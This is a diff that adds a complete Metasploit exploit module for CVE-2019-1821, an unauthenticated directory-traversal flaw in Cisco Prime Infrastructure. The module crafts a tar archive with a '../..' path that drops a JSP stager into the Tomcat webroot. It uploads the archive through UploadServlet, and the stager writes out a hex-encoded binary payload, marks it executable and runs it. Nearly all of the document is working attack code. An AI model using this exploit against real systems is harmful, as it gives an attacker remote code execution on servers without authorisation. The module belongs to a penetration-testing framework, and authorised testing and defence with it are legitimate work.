@@ -1,0 +1,202 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => 'Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability',
+      'Description'    => %q{
+        This module exploits a vulnerability found in Cisco Prime Infrastructure. The issue is that
+        the TarArchive Java class the HA Health Monitor component uses does not check for any
+        directory traversals while unpacking a Tar file, which can be abused by a remote user to
+        leverage the UploadServlet class to upload a JSP payload to the Apache Tomcat's web apps
+        directory, and gain arbitrary remote code execution. Note that authentication is not
+        required to exploit this vulnerability.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Steven Seeley', # Original discovery, PoC
+          'sinn3r'         # Metasploit module
+        ],
+      'Platform'       => 'linux',
+      'Arch'           => ARCH_X86,
+      'Targets'        =>
+        [
+          [ 'Cisco Prime Infrastructure 3.4.0.0', { } ]
+        ],
+      'References'     =>
+        [
+          ['CVE', '2019-1821'],
+          ['URL', 'https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html'],
+          ['URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190515-pi-rce'],
+          ['URL', 'https://srcincite.io/advisories/src-2019-0034/'],
+          ['URL', 'https://srcincite.io/pocs/src-2019-0034.py.txt']
+        ],
+      'DefaultOptions' =>
+        {
+          'RPORT' => 8082,
+          'SSL'   => true,
+
+        },
+      'Notes'          =>
+        {
+          'SideEffects' => [ IOC_IN_LOGS ],
+          'Reliability' => [ REPEATABLE_SESSION ],
+          'Stability'   => [ CRASH_SAFE ]
+        },
+      'Privileged'     => false,
+      'DisclosureDate' => 'May 15 2019',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptPort.new('WEBPORT', [true, 'Cisco Prime Infrastructure web interface', 443]),
+        OptString.new('TARGETURI', [true, 'The route for Cisco Prime Infrastructure web interface', '/'])
+      ])
+  end
+
+  class CPITarArchive
+    attr_reader :data
+    attr_reader :jsp_name
+    attr_reader :tar_name
+    attr_reader :stager
+    attr_reader :length
+
+    def initialize(name, stager)
+      @jsp_name = "#{name}.jsp"
+      @tar_name = "#{name}.tar"
+      @stager = stager
+      @data = make
+      @length = data.length
+    end
+
+    def make
+      data = ''
+      path = "../../opt/CSCOlumos/tomcat/webapps/ROOT/#{jsp_name}"
+      tar = StringIO.new
+      Rex::Tar::Writer.new(tar) do |t|
+        t.add_file(path, 0644) do |f|
+          f.write(stager)
+        end
+      end
+      tar.seek(0)
+      data = tar.read
+      tar.close
+      data
+    end
+  end
+
+  def check
+    res = send_request_cgi({
+      'rport'  => datastore['WEBPORT'],
+      'SSL'    => true,
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, 'webacs', 'pages', 'common', 'login.jsp')
+    })
+
+    unless res
+      vprint_error('No response from the server')
+      return CheckCode::Unknown
+    end
+
+    if res.code == 200 && res.headers['Server'] && res.headers['Server'] == 'Prime'
+      return CheckCode::Detected
+    end
+
+    CheckCode::Safe
+  end
+
+  def get_jsp_stager(out_file, bin_data)
+    # For some reason, some of the bytes tend to get lost at the end.
+    # Not really sure why, but some extra bytes are added to ensure the integrity
+    # of the code. This file will get deleted during cleanup anyway.
+    %Q|<%@ page import="java.io.*" %>
+    <%
+      String data = "#{Rex::Text.to_hex(bin_data, '')}";
+      FileOutputStream outputstream = new FileOutputStream("#{out_file}");
+      int numbytes = data.length();
+      byte[] bytes = new byte[numbytes/2];
+      for (int counter = 0; counter < numbytes; counter += 2)
+      {
+        char char1 = (char) data.charAt(counter);
+        char char2 = (char) data.charAt(counter + 1);
+        int comb = Character.digit(char1, 16) & 0xff;
+        comb <<= 4;
+        comb += Character.digit(char2, 16) & 0xff;
+        bytes[counter/2] = (byte)comb;
+      }
+      outputstream.write(bytes);
+      outputstream.close();
+      try {
+        Runtime.getRuntime().exec("chmod +x #{out_file}");
+        Runtime.getRuntime().exec("#{out_file}");
+      } catch (IOException exp) {}
+    %>#{Rex::Text.rand_text_alpha(30)}|
+  end
+
+  def make_tar
+    elf_name = "/tmp/#{Rex::Text.rand_text_alpha(10)}.bin"
+    register_file_for_cleanup(elf_name)
+    elf = generate_payload_exe(code: payload.encoded)
+    jsp_stager = get_jsp_stager(elf_name, elf)
+    tar_name = Rex::Text.rand_text_alpha(10)
+    register_file_for_cleanup("apache-tomcat-8.5.16/webapps/ROOT/#{tar_name}.jsp")
+    CPITarArchive.new(tar_name, jsp_stager)
+  end
+
+  def execute_payload(tar)
+    # Once executed, we are at:
+    # /opt/CSCOlumos
+    send_request_cgi({
+      'rport'  => datastore['WEBPORT'],
+      'SSL'    => true,
+      'method' => 'GET',
+      'uri'    => normalize_uri(target_uri.path, tar.jsp_name)
+    })
+  end
+
+  def upload_tar(tar)
+    post_data = Rex::MIME::Message.new
+    post_data.add_part(tar.data, nil, nil, "form-data; name=\"files\"; filename=\"#{tar.tar_name}\"")
+
+    # The file gets uploaded to this path on the server:
+    # /opt/CSCOlumos/apache-tomcat-8.5.16/webapps/ROOT/tar_name.jsp
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, 'servlet', 'UploadServlet'),
+      'data'   => post_data.to_s,
+      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
+      'headers' =>
+        {
+          'Destination-Dir' => 'tftpRoot',
+          'Compressed-Archive' => 'false',
+          'Primary-IP' => '127.0.0.1',
+          'Filecount' => '1',
+          'Filename' => tar.tar_name,
+          'FileSize' => tar.length
+        }
+    })
+
+    (res && res.code == 200)
+  end
+
+  def exploit
+    tar = make_tar
+    print_status("Uploading tar file (#{tar.length} bytes)")
+    if upload_tar(tar)
+      print_status('Executing JSP stager...')
+      execute_payload(tar)
+    else
+      print_status("Failed to upload #{tar.tar_name}")
+    end
+  end
+end
